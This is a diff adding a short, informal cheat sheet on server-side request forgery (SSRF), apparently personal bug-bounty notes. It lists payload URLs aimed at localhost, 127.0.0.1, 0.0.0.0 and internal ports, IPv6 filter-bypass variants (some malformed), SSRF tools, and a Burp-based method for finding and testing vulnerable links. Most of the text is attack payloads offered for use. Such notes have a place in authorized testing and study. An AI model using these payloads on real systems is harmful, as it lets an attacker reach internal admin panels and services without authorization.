@@ -1,0 +1,49 @@
+---SSRF---
+
+01. Server site attack >> admin, database
+02. Request Forgery >> url(localhost, 127.0.0.1, 192.168.0.1)  
+
+Payload : http://127.0.0.1/admin         
+
+Tools : SSRFmaps, Gopherus, See-SURF, SSRF=Sheriff,surf, ipfuscator 
+
+Payload:
+
+http://localhost:80  
+http://localhost:443
+http://localhost:22
+
+http://127.0.0.1:80  
+http://127.0.0.1:443
+http://127.0.0.1:22
+
+http://0.0.0.0:80  
+http://0.0.0.0:443
+http://0.0.0.0:22
+
+192.168.0.X
+
+Bypass Filters:
+
+http://127.0.0.1/
+http://localhost/
+
+http:[::]:80/
+http:[::]:25/
+http:[::]:22/
+http:[::]:3128/
+               
+http:[0000::1]:80/
+http:[0000::1]:25/
+http:[0000::1]:22/
+http:[0000::1]:3128/                                                                     
+Reference : Payloadallthings SSRF    
+
+
+Method:
+--> You must find a link and encoded link that called from another
+--> Right click > extention > burp bounty pro > Active Scan > SSRF 
+--> Then you must send to repeater and try to payloads 
+--> if you see that something is happening that means here is SSRF 
+
+Tips : Try SSRF where is link               
